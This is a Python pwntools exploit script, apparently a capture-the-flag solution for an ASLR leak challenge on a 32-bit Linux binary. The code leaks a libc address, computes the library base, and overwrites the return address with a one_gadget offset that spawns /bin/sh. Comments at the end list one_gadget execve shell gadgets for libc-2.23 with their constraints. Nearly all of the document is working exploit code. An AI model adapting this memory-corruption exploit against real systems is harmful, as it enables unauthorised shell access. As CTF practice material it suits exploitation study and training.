from pwn import *

context.arch = "i386"
context.os = "linux"
context.terminal = ["tmux", "new-window"]
elfLibC = ELF(b"./libc-2.23.so")


staticBaseLibc = 0xf7d66000
challengeAddr = 0x565556e6
offsetToRet = 0x1c
addrsLeaked = 0xf7f9cd00
offsetToBase = addrsLeaked - staticBaseLibc
print(offsetToBase)
P = process("./bin")
#P = gdb.debug("./bin", '''
#    break challenge
#    continue
#''')
input()
P.send(b"A")
output = P.recvuntil(b"\n")[-4:-1]
output = b"\x00" + output

aslrLeaked = u32(output)
print(output)
print(hex(aslrLeaked))

print(hex(aslrLeaked))

aslrLeaked = aslrLeaked - offsetToBase
print(hex(aslrLeaked))
valueToAddToBase = 0x3a81c
aslrLeaked = aslrLeaked + valueToAddToBase



P.send((b"\x00"*offsetToRet + p32(aslrLeaked)).ljust(0x40, b"\x00"))
P.interactive()


# ┌──(s1gn3rs㉿l4pt0p)-[~/…/stt/Scoreboard/ASLR/02_aslr2_leak]
# └─$ one_gadget libc-2.23.so
# 0x3a81c execve("/bin/sh", esp+0x28, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x28] == NULL || {[esp+0x28], [esp+0x2c], [esp+0x30], [esp+0x34], ...} is a valid argv

# 0x3a81e execve("/bin/sh", esp+0x2c, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x2c] == NULL || {[esp+0x2c], [esp+0x30], [esp+0x34], [esp+0x38], ...} is a valid argv

# 0x3a822 execve("/bin/sh", esp+0x30, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x30] == NULL || {[esp+0x30], [esp+0x34], [esp+0x38], [esp+0x3c], ...} is a valid argv

# 0x3a829 execve("/bin/sh", esp+0x34, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x34] == NULL || {[esp+0x34], [esp+0x38], [esp+0x3c], [esp+0x40], ...} is a valid argv

# 0x5f075 execl("/bin/sh", eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

# 0x5f076 execl("/bin/sh", [esp])
# constraints:
#   esi is the GOT address of libc
#   [esp] == NULL